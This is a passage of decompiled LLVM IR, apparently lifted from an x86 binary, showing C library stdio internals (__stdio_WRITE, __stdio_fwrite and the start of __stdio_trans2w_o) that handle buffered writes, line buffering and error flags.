  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 1, 0, 5, 2, 3, 6, 4 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80540fe, { 1, 0 }
  uselistorder label %dec_label_pc_80540fa, { 1, 0 }
  uselistorder label %dec_label_pc_80540d8, { 1, 0 }
  uselistorder label %dec_label_pc_80540d1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80540c7, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8054109 = load i32, i32* @edi, align 4
  %v0_805410b = load i32, i32* @ebx, align 4
  %v4_805410f = ptrtoint i16* %arg1 to i32
  store i32 %v4_805410f, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_805411b4 = icmp eq i32 %arg3, 0
  br i1 %v1_805411b4, label %dec_label_pc_805417a, label %dec_label_pc_8054120.lr.ph

dec_label_pc_8054120.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8054120

dec_label_pc_8054120:                             ; preds = %dec_label_pc_805413f.dec_label_pc_8054120_crit_edge, %dec_label_pc_8054120.lr.ph
  %v0_8054130 = phi i32 [ %v4_805410f, %dec_label_pc_8054120.lr.ph ], [ %v0_8054130.pre, %dec_label_pc_805413f.dec_label_pc_8054120_crit_edge ]
  %v0_805412f = phi i32 [ %arg2, %dec_label_pc_8054120.lr.ph ], [ %v2_8054141, %dec_label_pc_805413f.dec_label_pc_8054120_crit_edge ]
  %v0_8054122.in = phi i32 [ %arg3, %dec_label_pc_8054120.lr.ph ], [ %v2_805413f, %dec_label_pc_805413f.dec_label_pc_8054120_crit_edge ]
  %v0_8054122 = icmp slt i32 %v0_8054122.in, 0
  store i32 %v0_8054122.in, i32* %ebp.global-to-local, align 4
  %v2_8054122 = icmp eq i1 %v0_8054122, false
  %storemerge = select i1 %v2_8054122, i32 %v0_8054122.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8054130 = add i32 %v0_8054130, 4
  %v2_8054130 = inttoptr i32 %v1_8054130 to i32*
  %v3_8054130 = load i32, i32* %v2_8054130, align 4
  %tmp36 = inttoptr i32 %v0_805412f to i32*
  %v5_8054133 = call i32 @__libc_write(i32 %v3_8054130, i32* %tmp36, i32 %storemerge)
  store i32 %v5_8054133, i32* %eax.global-to-local, align 4
  %v2_805413b = icmp slt i32 %v5_8054133, 0
  br i1 %v2_805413b, label %dec_label_pc_8054145, label %dec_label_pc_805413f

dec_label_pc_805413f:                             ; preds = %dec_label_pc_8054120
  %v0_805413f = load i32, i32* @ebx, align 4
  %v2_805413f = sub i32 %v0_805413f, %v5_8054133
  %v12_805413f = icmp eq i32 %v2_805413f, 0
  store i32 %v2_805413f, i32* @ebx, align 4
  %v0_8054141 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054141 = add i32 %v0_8054141, %v5_8054133
  store i32 %v2_8054141, i32* %esi.global-to-local, align 4
  br i1 %v12_805413f, label %dec_label_pc_805417a, label %dec_label_pc_805413f.dec_label_pc_8054120_crit_edge

dec_label_pc_805413f.dec_label_pc_8054120_crit_edge: ; preds = %dec_label_pc_805413f
  %v0_8054130.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054120

dec_label_pc_8054145:                             ; preds = %dec_label_pc_8054120
  %v0_8054145 = load i32, i32* @edi, align 4
  %v1_8054145 = add i32 %v0_8054145, 8
  %v2_8054145 = inttoptr i32 %v1_8054145 to i32*
  %v3_8054145 = load i32, i32* %v2_8054145, align 4
  store i32 %v3_8054145, i32* @edx, align 4
  %v1_8054148 = add i32 %v0_8054145, 12
  %v2_8054148 = inttoptr i32 %v1_8054148 to i32*
  %v3_8054148 = load i32, i32* %v2_8054148, align 4
  store i32 %v3_8054148, i32* %eax.global-to-local, align 4
  %v1_805414b = inttoptr i32 %v0_8054145 to i16*
  %v2_805414b = load i16, i16* %v1_805414b, align 2
  %v3_805414b = or i16 %v2_805414b, 8
  store i16 %v3_805414b, i16* %v1_805414b, align 2
  %v0_805414f = load i32, i32* %eax.global-to-local, align 4
  %v1_805414f = load i32, i32* @edx, align 4
  %v2_805414f = sub i32 %v0_805414f, %v1_805414f
  %v12_805414f = icmp eq i32 %v2_805414f, 0
  store i32 %v2_805414f, i32* %eax.global-to-local, align 4
  %v4_8054176.pre = load i32, i32* @ebx, align 4
  br i1 %v12_805414f, label %dec_label_pc_8054176, label %dec_label_pc_8054153

dec_label_pc_8054153:                             ; preds = %dec_label_pc_8054145
  %v6_8054155 = icmp ugt i32 %v2_805414f, %v4_8054176.pre
  br i1 %v6_8054155, label %dec_label_pc_8054159.preheader, label %dec_label_pc_8054157

dec_label_pc_8054157:                             ; preds = %dec_label_pc_8054153
  store i32 %v2_805414f, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054159.preheader

dec_label_pc_8054159.preheader:                   ; preds = %dec_label_pc_8054157, %dec_label_pc_8054153
  %v0_8054159.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054159

dec_label_pc_8054159:                             ; preds = %dec_label_pc_8054159.preheader, %dec_label_pc_805416b
  %v2_805415b = phi i32 [ %v1_805414f, %dec_label_pc_8054159.preheader ], [ %v1_8054167, %dec_label_pc_805416b ]
  %v4_8054159 = phi i32 [ %v2_805414f, %dec_label_pc_8054159.preheader ], [ %v0_805415d, %dec_label_pc_805416b ]
  %v0_8054159 = phi i32 [ %v0_8054159.pre, %dec_label_pc_8054159.preheader ], [ %v1_805416b, %dec_label_pc_805416b ]
  %v1_8054159 = inttoptr i32 %v0_8054159 to i8*
  %v2_8054159 = load i8, i8* %v1_8054159, align 1
  %v3_8054159 = zext i8 %v2_8054159 to i32
  %v5_8054159 = and i32 %v4_8054159, -256
  %v6_8054159 = or i32 %v3_8054159, %v5_8054159
  store i32 %v6_8054159, i32* %eax.global-to-local, align 4
  %v3_805415b = inttoptr i32 %v2_805415b to i8*
  store i8 %v2_8054159, i8* %v3_805415b, align 1
  %v0_805415d = load i32, i32* %eax.global-to-local, align 4
  %v1_805415d = trunc i32 %v0_805415d to i8
  %v10_805415d = icmp eq i8 %v1_805415d, 10
  %v1_805415f = icmp eq i1 %v10_805415d, false
  br i1 %v1_805415f, label %dec_label_pc_8054167, label %dec_label_pc_8054161

dec_label_pc_8054161:                             ; preds = %dec_label_pc_8054159
  %v0_8054161 = load i32, i32* @edi, align 4
  %v1_8054161 = add i32 %v0_8054161, 1
  %v2_8054161 = inttoptr i32 %v1_8054161 to i8*
  %v3_8054161 = load i8, i8* %v2_8054161, align 1
  %v4_8054161 = urem i8 %v3_8054161, 2
  %v5_8054161 = icmp eq i8 %v4_8054161, 0
  %v1_8054165 = icmp eq i1 %v5_8054161, false
  br i1 %v1_8054165, label %dec_label_pc_8054161.dec_label_pc_805416e_crit_edge, label %dec_label_pc_8054167

dec_label_pc_8054161.dec_label_pc_805416e_crit_edge: ; preds = %dec_label_pc_8054161
  %v0_805416e.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805416e

dec_label_pc_8054167:                             ; preds = %dec_label_pc_8054161, %dec_label_pc_8054159
  %v0_8054167 = load i32, i32* @edx, align 4
  %v1_8054167 = add i32 %v0_8054167, 1
  store i32 %v1_8054167, i32* @edx, align 4
  %v0_8054168 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054168 = add i32 %v0_8054168, -1
  %v8_8054168 = icmp eq i32 %v1_8054168, 0
  store i32 %v1_8054168, i32* %ebp.global-to-local, align 4
  br i1 %v8_8054168, label %dec_label_pc_8054167.dec_label_pc_805416e_crit_edge, label %dec_label_pc_805416b

dec_label_pc_8054167.dec_label_pc_805416e_crit_edge: ; preds = %dec_label_pc_8054167
  %v1_805416e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805416e

dec_label_pc_805416b:                             ; preds = %dec_label_pc_8054167
  %v0_805416b = load i32, i32* %esi.global-to-local, align 4
  %v1_805416b = add i32 %v0_805416b, 1
  store i32 %v1_805416b, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054159

dec_label_pc_805416e:                             ; preds = %dec_label_pc_8054167.dec_label_pc_805416e_crit_edge, %dec_label_pc_8054161.dec_label_pc_805416e_crit_edge
  %v1_805416e = phi i32 [ %v0_8054161, %dec_label_pc_8054161.dec_label_pc_805416e_crit_edge ], [ %v1_805416e.pre, %dec_label_pc_8054167.dec_label_pc_805416e_crit_edge ]
  %v0_805416e = phi i32 [ %v0_805416e.pre, %dec_label_pc_8054161.dec_label_pc_805416e_crit_edge ], [ %v1_8054167, %dec_label_pc_8054167.dec_label_pc_805416e_crit_edge ]
  %v2_805416e = add i32 %v1_805416e, 16
  %v3_805416e = inttoptr i32 %v2_805416e to i32*
  store i32 %v0_805416e, i32* %v3_805416e, align 4
  %v0_8054171 = load i32, i32* @edx, align 4
  %v1_8054171 = load i32, i32* @edi, align 4
  %v2_8054171 = add i32 %v1_8054171, 8
  %v3_8054171 = inttoptr i32 %v2_8054171 to i32*
  %v4_8054171 = load i32, i32* %v3_8054171, align 4
  %v5_8054171 = sub i32 %v0_8054171, %v4_8054171
  store i32 %v5_8054171, i32* @edx, align 4
  %v0_8054174 = load i32, i32* @ebx, align 4
  %v2_8054174 = sub i32 %v0_8054174, %v5_8054171
  br label %dec_label_pc_8054176

dec_label_pc_8054176:                             ; preds = %dec_label_pc_8054145, %dec_label_pc_805416e
  %v4_8054176 = phi i32 [ %v2_8054174, %dec_label_pc_805416e ], [ %v4_8054176.pre, %dec_label_pc_8054145 ]
  %v5_8054176 = sub i32 %arg3, %v4_8054176
  br label %dec_label_pc_805417a

dec_label_pc_805417a:                             ; preds = %dec_label_pc_805413f, %entry, %dec_label_pc_8054176
  %stack_var_12.0 = phi i32 [ %v5_8054176, %dec_label_pc_8054176 ], [ 0, %entry ], [ %arg3, %dec_label_pc_805413f ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_805410b, i32* @ebx, align 4
  store i32 %v0_8054109, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_805416b, { 1, 0 }
  uselistorder i32 %v1_8054168, { 1, 0 }
  uselistorder i32 %v1_8054167, { 0, 2, 1 }
  uselistorder i32 %v0_805415d, { 1, 0 }
  uselistorder i32 %v2_8054141, { 1, 0 }
  uselistorder i32 %v2_805413f, { 1, 2, 0 }
  uselistorder i32 %v5_8054133, { 0, 2, 1, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 2, 0, 1 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_805417a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054176, { 1, 0 }
  uselistorder label %dec_label_pc_8054159, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8054188 = load i32, i32* @ebp, align 4
  %v0_8054189 = load i32, i32* @edi, align 4
  %v0_805418a = load i32, i32* @esi, align 4
  %v0_805418b = load i32, i32* @ebx, align 4
  store i32 %v0_805418b, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_805419b = add i32 %arg3, 1
  %v2_805419b = inttoptr i32 %v1_805419b to i8*
  %v3_805419b = load i8, i8* %v2_805419b, align 1
  %v4_805419b = and i8 %v3_805419b, 2
  %v5_805419b = icmp eq i8 %v4_805419b, 0
  %v1_805419f = icmp eq i1 %v5_805419b, false
  br i1 %v1_805419f, label %dec_label_pc_8054256, label %dec_label_pc_80541a5

dec_label_pc_80541a5:                             ; preds = %entry
  %v1_80541a5 = add i32 %arg3, 4
  %v2_80541a5 = inttoptr i32 %v1_80541a5 to i32*
  %v3_80541a5 = load i32, i32* %v2_80541a5, align 4
  %v13_80541a5 = icmp eq i32 %v3_80541a5, -2
  %v1_80541a9 = add i32 %arg3, 16
  %v2_80541a9 = inttoptr i32 %v1_80541a9 to i32*
  %v3_80541a9 = load i32, i32* %v2_80541a9, align 4
  store i32 %v3_80541a9, i32* @edx, align 4
  %v1_80541ac = add i32 %arg3, 12
  %v2_80541ac = inttoptr i32 %v1_80541ac to i32*
  %v3_80541ac = load i32, i32* %v2_80541ac, align 4
  %v1_80541af = icmp eq i1 %v13_80541a5, false
  %v2_80541cf = sub i32 %v3_80541ac, %v3_80541a9
  store i32 %v2_80541cf, i32* %eax.global-to-local, align 4
  br i1 %v1_80541af, label %dec_label_pc_80541cf, label %dec_label_pc_80541b1

dec_label_pc_80541b1:                             ; preds = %dec_label_pc_80541a5
  %tmp22 = icmp ult i32 %v2_80541cf, %arg2
  br i1 %tmp22, label %dec_label_pc_80541b9, label %dec_label_pc_80541bb

dec_label_pc_80541b9:                             ; preds = %dec_label_pc_80541b1
  br label %dec_label_pc_80541bb

dec_label_pc_80541bb:                             ; preds = %dec_label_pc_80541b1, %dec_label_pc_80541b9
  %storemerge = phi i32 [ %v2_80541cf, %dec_label_pc_80541b9 ], [ %arg2, %dec_label_pc_80541b1 ]
  %v0_80541bc = phi i32 [ %v2_80541cf, %dec_label_pc_80541b9 ], [ %arg2, %dec_label_pc_80541b1 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_80541bf = inttoptr i32 %v3_80541a9 to i16*
  %v4_80541bf = call i32 @memcpy(i16* %v3_80541bf, i32 %v0_80541bc, i32 %v2_80541cf)
  store i32 %v4_80541bf, i32* %eax.global-to-local, align 4
  %v0_80541c4 = load i32, i32* @ebx, align 4
  %v1_80541c4 = add i32 %v0_80541c4, 16
  %v2_80541c4 = inttoptr i32 %v1_80541c4 to i32*
  %v3_80541c4 = load i32, i32* %v2_80541c4, align 4
  %v4_80541c4 = load i32, i32* @esi, align 4
  %v5_80541c4 = add i32 %v4_80541c4, %v3_80541c4
  store i32 %v5_80541c4, i32* %v2_80541c4, align 4
  br label %dec_label_pc_805426e

dec_label_pc_80541cf:                             ; preds = %dec_label_pc_80541a5
  %v6_80541d3 = icmp ult i32 %v2_80541cf, %arg2
  br i1 %v6_80541d3, label %dec_label_pc_805423d, label %dec_label_pc_80541d5

dec_label_pc_80541d5:                             ; preds = %dec_label_pc_80541cf
  %v0_80541d5 = load i32, i32* @ecx, align 4
  %v3_80541d9 = inttoptr i32 %v3_80541a9 to i16*
  %v4_80541d9 = call i32 @memcpy(i16* %v3_80541d9, i32 %arg2, i32 %v0_80541d5)
  store i32 %v4_80541d9, i32* %eax.global-to-local, align 4
  %v0_80541de = load i32, i32* @ebx, align 4
  %v1_80541de = add i32 %v0_80541de, 16
  %v2_80541de = inttoptr i32 %v1_80541de to i32*
  %v3_80541de = load i32, i32* %v2_80541de, align 4
  %v4_80541de = load i32, i32* @edi, align 4
  %v5_80541de = add i32 %v4_80541de, %v3_80541de
  store i32 %v5_80541de, i32* %v2_80541de, align 4
  %v0_80541e4 = load i32, i32* @ebx, align 4
  %v1_80541e4 = add i32 %v0_80541e4, 1
  %v2_80541e4 = inttoptr i32 %v1_80541e4 to i8*
  %v3_80541e4 = load i8, i8* %v2_80541e4, align 1
  %v4_80541e4 = urem i8 %v3_80541e4, 2
  %v5_80541e4 = icmp eq i8 %v4_80541e4, 0
  br i1 %v5_80541e4, label %dec_label_pc_805426e, label %dec_label_pc_80541ee

dec_label_pc_80541ee:                             ; preds = %dec_label_pc_80541d5
  %v0_80541ee = load i32, i32* @edx, align 4
  %v0_80541ef = load i32, i32* @edi, align 4
  %v4_80541f3 = call i32 @memrchr(i8 10, i32 %v0_80541ef, i32 %v0_80541ee)
  store i32 %v4_80541f3, i32* %eax.global-to-local, align 4
  %v1_80541fb = icmp eq i32 %v4_80541f3, 0
  br i1 %v1_80541fb, label %dec_label_pc_805426e, label %dec_label_pc_80541ff

dec_label_pc_80541ff:                             ; preds = %dec_label_pc_80541ee
  %v0_8054202 = load i32, i32* @ebx, align 4
  %v1_8054203 = call i32 @__stdio_wcommit(i32 %v0_8054202)
  store i32 %v1_8054203, i32* %eax.global-to-local, align 4
  %v1_805420b = icmp eq i32 %v1_8054203, 0
  br i1 %v1_805420b, label %dec_label_pc_805426e, label %dec_label_pc_805420f

dec_label_pc_805420f:                             ; preds = %dec_label_pc_80541ff
  %v0_805420f = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_805420f, %v1_8054203
  br i1 %tmp23, label %dec_label_pc_8054215, label %dec_label_pc_8054217

dec_label_pc_8054215:                             ; preds = %dec_label_pc_805420f
  br label %dec_label_pc_8054217

dec_label_pc_8054217:                             ; preds = %dec_label_pc_805420f, %dec_label_pc_8054215
  %storemerge24 = phi i32 [ %v1_8054203, %dec_label_pc_8054215 ], [ %v0_805420f, %dec_label_pc_805420f ]
  %v0_805421e = phi i32 [ %v1_8054203, %dec_label_pc_8054215 ], [ %v0_805420f, %dec_label_pc_805420f ]
  store i32 %storemerge24, i32* %esi.global-to-local, align 4
  %v2_8054219 = sub i32 %v0_805420f, %v0_805421e
  store i32 %v2_8054219, i32* %eax.global-to-local, align 4
  %v0_805421b = load i32, i32* @ebp, align 4
  %v2_805421b = add i32 %v0_805421b, %v2_8054219
  store i32 %v2_805421b, i32* %ebp.global-to-local, align 4
  %v4_8054222 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v0_805421e, i32 %v2_8054219)
  store i32 %v4_8054222, i32* %eax.global-to-local, align 4
  store i32 %v4_8054222, i32* @edx, align 4
  %v1_805422c = icmp eq i32 %v4_8054222, 0
  br i1 %v1_805422c, label %dec_label_pc_805426e, label %dec_label_pc_8054230

dec_label_pc_8054230:                             ; preds = %dec_label_pc_8054217
  %v0_8054230 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054230 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054230 = sub i32 %v0_8054230, %v4_8054222
  %v2_8054234 = add i32 %v2_8054230, %v1_8054230
  store i32 %v2_8054234, i32* %eax.global-to-local, align 4
  %v0_8054236 = load i32, i32* @ebx, align 4
  %v1_8054236 = add i32 %v0_8054236, 16
  %v2_8054236 = inttoptr i32 %v1_8054236 to i32*
  %v3_8054236 = load i32, i32* %v2_8054236, align 4
  %v5_8054236 = sub i32 %v3_8054236, %v2_8054234
  store i32 %v5_8054236, i32* %v2_8054236, align 4
  %v0_8054239 = load i32, i32* @edi, align 4
  %v1_8054239 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054239 = sub i32 %v0_8054239, %v1_8054239
  store i32 %v2_8054239, i32* @edi, align 4
  br label %dec_label_pc_805426e

dec_label_pc_805423d:                             ; preds = %dec_label_pc_80541cf
  %v2_805423d = add i32 %arg3, 8
  %v3_805423d = inttoptr i32 %v2_805423d to i32*
  %v4_805423d = load i32, i32* %v3_805423d, align 4
  %v15_805423d = icmp eq i32 %v3_80541a9, %v4_805423d
  br i1 %v15_805423d, label %dec_label_pc_8054256, label %dec_label_pc_8054242

dec_label_pc_8054242:                             ; preds = %dec_label_pc_805423d
  %v1_8054246 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8054246, i32* %eax.global-to-local, align 4
  %v1_805424e = icmp eq i32 %v1_8054246, 0
  br i1 %v1_805424e, label %dec_label_pc_8054242.dec_label_pc_8054256_crit_edge, label %dec_label_pc_8054252

dec_label_pc_8054242.dec_label_pc_8054256_crit_edge: ; preds = %dec_label_pc_8054242
  %v0_8054256.pre = load i32, i32* @edi, align 4
  %v0_805425e.pre = load i32, i32* @ebx, align 4
  %v2_8054265.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8054256

dec_label_pc_8054252:                             ; preds = %dec_label_pc_8054242
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_805426e

dec_label_pc_8054256:                             ; preds = %dec_label_pc_8054242.dec_label_pc_8054256_crit_edge, %dec_label_pc_805423d, %entry
  %v2_8054265 = phi i32 [ %v2_8054265.pre, %dec_label_pc_8054242.dec_label_pc_8054256_crit_edge ], [ %v0_805418b, %dec_label_pc_805423d ], [ %v0_805418b, %entry ]
  %v0_805425e = phi i32 [ %v0_805425e.pre, %dec_label_pc_8054242.dec_label_pc_8054256_crit_edge ], [ %arg3, %dec_label_pc_805423d ], [ %arg3, %entry ]
  %v0_8054256 = phi i32 [ %v0_8054256.pre, %dec_label_pc_8054242.dec_label_pc_8054256_crit_edge ], [ %arg2, %dec_label_pc_805423d ], [ %arg2, %entry ]
  store i32 %v2_8054265, i32* @ebx, align 4
  store i32 %v0_8054189, i32* @edi, align 4
  %v4_8054269 = inttoptr i32 %v0_805425e to i16*
  %v5_8054269 = call i32 @__stdio_WRITE(i16* %v4_8054269, i32 %v0_8054256, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8054269, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805426e

dec_label_pc_805426e:                             ; preds = %dec_label_pc_8054217, %dec_label_pc_80541ff, %dec_label_pc_80541ee, %dec_label_pc_80541d5, %dec_label_pc_8054252, %dec_label_pc_8054230, %dec_label_pc_80541bb, %dec_label_pc_8054256
  %v0_8054271 = load i32, i32* @edi, align 4
  store i32 %v0_8054271, i32* %eax.global-to-local, align 4
  %v2_8054273 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8054273, i32* @ebx, align 4
  store i32 %v0_805418a, i32* @esi, align 4
  store i32 %v0_8054189, i32* @edi, align 4
  store i32 %v0_8054188, i32* @ebp, align 4
  ret i32 %v0_8054271

; uselistorder directives
  uselistorder i32 %v2_8054234, { 1, 0 }
  uselistorder i32 %v4_8054222, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8054219, { 1, 0, 2 }
  uselistorder i32 %v0_805420f, { 3, 0, 1, 2 }
  uselistorder i32 %v2_80541cf, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_8054189, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_805426e, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_8054217, { 1, 0 }
  uselistorder label %dec_label_pc_80541bb, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8054278 = load i32, i32* @ebx, align 4
  %v4_805427c = ptrtoint i16* %arg1 to i32
  store i32 %v4_805427c, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8054284 = bitcast i16* %arg1 to i32*
  %v2_8054284 = load i32, i32* %v1_8054284, align 4
  store i32 %v2_8054284, i32* %eax.global-to-local, align 4
  %v1_8054286 = urem i32 %v2_8054284, 65536
  store i32 %v1_8054286, i32* %edx.global-to-local, align 4
  %v2_8054289 = and i32 %v1_8054286, %arg2
  %v3_8054289 = icmp eq i32 %v2_8054289, 0
  %v1_805428b = icmp eq i1 %v3_8054289, false
  br i1 %v1_805428b, label %dec_label_pc_805429a, label %dec_label_pc_805428d

dec_label_pc_805428d:                             ; preds = %entry
  %v1_805428d = and i32 %v2_8054284, 2176
  %v2_805428d = icmp eq i32 %v1_805428d, 0
  store i32 %v1_805428d, i32* %edx.global-to-local, align 4
  %v1_8054293 = icmp eq i1 %v2_805428d, false
  br i1 %v1_8054293, label %dec_label_pc_80542a2, label %dec_label_pc_8054295

dec_label_pc_8054295:                             ; preds = %dec_label_pc_805428d
  %v2_8054295 = or i32 %v2_8054284, %arg2
  store i32 %v2_8054295, i32* %eax.global-to-local, align 4
  %v1_8054297 = trunc i32 %v2_8054295 to i16
  store i16 %v1_8054297, i16* %arg1, align 2
  %v0_805429a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805429a

dec_label_pc_805429a:                             ; preds = %entry, %dec_label_pc_8054295
  %v0_80542df = phi i32 [ %v4_805427c, %entry ], [ %v0_805429a.pre, %dec_label_pc_8054295 ]
  %v1_805429a = inttoptr i32 %v0_80542df to i16*
  %v2_805429a = load i16, i16* %v1_805429a, align 2
  %v3_805429a = zext i16 %v2_805429a to i32
  store i32 %v3_805429a, i32* %edx.global-to-local, align 4
  %v2_805429d = and i16 %v2_805429a, 32
  %v3_805429d = icmp eq i16 %v2_805429d, 0
  br i1 %v3_805429d, label %dec_label_pc_80542b6, label %dec_label_pc_80542a2

dec_label_pc_80542a2:                             ; preds = %dec_label_pc_805429a, %dec_label_pc_805428d
  %v1_80542a2 = call i32 @__errno_location(i32 %v0_8054278)
  store i32 %v1_80542a2, i32* %eax.global-to-local, align 4
  %v1_80542a7 = inttoptr i32 %v1_80542a2 to i32*
  store i32 9, i32* %v1_80542a7, align 4
  br label %dec_label_pc_80542ad

dec_label_pc_80542ad:                             ; preds = %dec_label_pc_80542cd, %dec_label_pc_80542a2
  %v0_80542ad = load i32, i32* @ebx, align 4
  %v1_80542ad = inttoptr i32 %v0_80542ad to i16*
  %v2_80542ad = load i16, i16* %v1_80542ad, align 2
  %v3_80542ad = or i16 %v2_80542ad, 8
  store i16 %v3_80542ad, i16* %v1_80542ad, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054310

dec_label_pc_80542b6:                             ; preds = %dec_label_pc_805429a
  %v2_80542b6 = urem i16 %v2_805429a, 4
  %v3_80542b6 = icmp eq i16 %v2_80542b6, 0
  br i1 %v3_80542b6, label %dec_label_pc_80542fc, label %dec_label_pc_80542bb

dec_label_pc_80542bb:                             ; preds = %dec_label_pc_80542b6
  %v2_80542bb = and i32 %v3_805429a, 4
  %v3_80542bb = icmp eq i32 %v2_80542bb, 0
  %v1_80542be = icmp eq i1 %v3_80542bb, false
  br i1 %v1_80542be, label %dec_label_pc_80542ec, label %dec_label_pc_80542c0

dec_label_pc_80542c0:                             ; preds = %dec_label_pc_80542bb
  %v1_80542c0 = add i32 %v0_80542df, 20
  %v2_80542c0 = inttoptr i32 %v1_80542c0 to i32*
  %v3_80542c0 = load i32, i32* %v2_80542c0, align 4
  store i32 %v3_80542c0, i32* %eax.global-to-local, align 4
  %v2_80542c3 = add i32 %v0_80542df, 16
  %v3_80542c3 = inttoptr i32 %v2_80542c3 to i32*
  %v4_80542c3 = load i32, i32* %v3_80542c3, align 4
  %v15_80542c3 = icmp eq i32 %v3_80542c0, %v4_80542c3
  %v1_80542c6 = icmp eq i1 %v15_80542c3, false
  br i1 %v1_80542c6, label %dec_label_pc_80542cd, label %dec_label_pc_80542c8

dec_label_pc_80542c8:                             ; preds = %dec_label_pc_80542c0
  %v2_80542c8 = and i32 %v3_805429a, 2
  %v3_80542c8 = icmp eq i32 %v2_80542c8, 0
  br i1 %v3_80542c8, label %dec_label_pc_80542ec, label %dec_label_pc_80542cd

dec_label_pc_80542cd:                             ; preds = %dec_label_pc_80542c8, %dec_label_pc_80542c0
  %v1_80542cd = and i32 %v3_805429a, 1024
  store i32 %v1_80542cd, i32* %edx.global-to-local, align 4
  %tmp17 = udiv i32 %v1_80542cd, 1024
  %tmp18 = xor i32 %tmp17, 3
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v5_80542e0 = call i32 @__GI_fseek(i32 %v0_80542df, i32 0, i32 %tmp18, i32 %v1_80542cd)
  store i32 %v5_80542e0, i32* %eax.global-to-local, align 4
  %v1_80542e8 = icmp eq i32 %v5_80542e0, 0
  %v1_80542ea = icmp eq i1 %v1_80542e8, false
  br i1 %v1_80542ea, label %dec_label_pc_80542ad, label %dec_label_pc_80542cd.dec_label_pc_80542ec_crit_edge

dec_label_pc_80542cd.dec_label_pc_80542ec_crit_edge: ; preds = %dec_label_pc_80542cd
  %v0_80542ec.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80542ec

dec_label_pc_80542ec:                             ; preds = %dec_label_pc_80542cd.dec_label_pc_80542ec_crit_edge, %dec_label_pc_80542c8, %dec_label_pc_80542bb
  %v10_80542ec = phi i32 [ %v0_80542ec.pre, %dec_label_pc_80542cd.dec_label_pc_80542ec_crit_edge ], [ %v0_80542df, %dec_label_pc_80542c8 ], [ %v0_80542df, %dec_label_pc_80542bb ]
  %v1_80542ec = inttoptr i32 %v10_80542ec to i16*
  %v2_80542ec = load i16, i16* %v1_80542ec, align 2
